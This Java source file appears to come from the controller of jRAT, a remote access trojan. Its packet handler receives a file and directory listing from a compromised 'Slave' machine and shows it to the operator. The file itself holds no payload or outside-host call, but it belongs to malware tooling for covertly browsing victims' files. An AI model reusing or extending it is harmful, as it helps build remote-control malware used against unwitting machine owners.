package io.jrat.controller.packets.incoming;

import iconlib.FileIconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.io.FileObject;
import io.jrat.controller.ui.frames.FrameRemoteFiles;

import java.io.DataInputStream;
import java.util.ArrayList;
import java.util.List;


public class Packet22ListFiles extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteFiles fr = FrameRemoteFiles.INSTANCES.get(slave);
		List<FileObject> files = new ArrayList<FileObject>();
		List<FileObject> dirs = new ArrayList<FileObject>();

		int len = dis.readInt();

		for (int i = 0; i < len; i++) {
			String path = slave.readLine();
			FileObject fo = new FileObject(path);

			boolean dir = dis.readBoolean();
			boolean hidden = dis.readBoolean();
			
			fo.setHidden(hidden);
			fo.setIcon(FileIconUtils.getIconFromExtension(path, dir));
			
			if (dir) {
				dirs.add(fo);
			} else {
				long date = slave.readLong();
				long size = slave.readLong();

				fo.setDate(date);
				fo.setSize(size);	
				
				files.add(fo);
			}
		}

		if (fr != null) {
			fr.getFilesPanel().getRemoteTable().clear();

			for (FileObject fo : dirs) {
				fr.getFilesPanel().getRemoteTable().addFileObject(fo);
			}
			
			for (FileObject fo : files) {
				fr.getFilesPanel().getRemoteTable().addFileObject(fo);
			}
		}

	}

}
